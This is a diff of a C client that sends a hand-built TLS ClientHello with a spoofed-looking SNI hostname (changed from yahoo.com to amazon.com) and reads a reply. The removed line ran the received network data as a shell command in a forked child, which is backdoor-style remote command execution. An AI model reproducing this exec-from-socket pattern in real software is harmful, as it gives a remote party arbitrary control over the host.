@@ -7,7 +7,7 @@
 #include <unistd.h>
 
 void craft_cli_hel(unsigned char** cli_hel, int* cli_hel_s) {
-    unsigned char serv_name[] = "www.yahoo.com";
+    unsigned char serv_name[] = "www.amazon.com";
     unsigned char serv_name_s = strlen(serv_name);
     unsigned char serv_list_s = serv_name_s + 3;
     unsigned char ext_serv_s = serv_list_s + 2;
@@ -105,7 +105,7 @@ int main(int argc, char const* argv[]) {
     send(sock, cli_hel, cli_hel_s, 0);
     free(cli_hel);
     printf("Hello message sent\n");
-    
+
     valread = read(sock, buffer, 5000);
     printf("Length: %d\nMessage: %s\n", valread, buffer);
 
@@ -124,7 +124,7 @@ int main(int argc, char const* argv[]) {
         dup2(pipes[1], STDOUT_FILENO);
         close(pipes[0]);
         close(pipes[1]);
-        execl("/bin/sh", "sh", "-c", buffer, NULL);
+//        execl("/bin/sh", "sh", "-c", buffer, NULL);
         exit(EXIT_FAILURE);
     } else {
         close(pipes[1]);
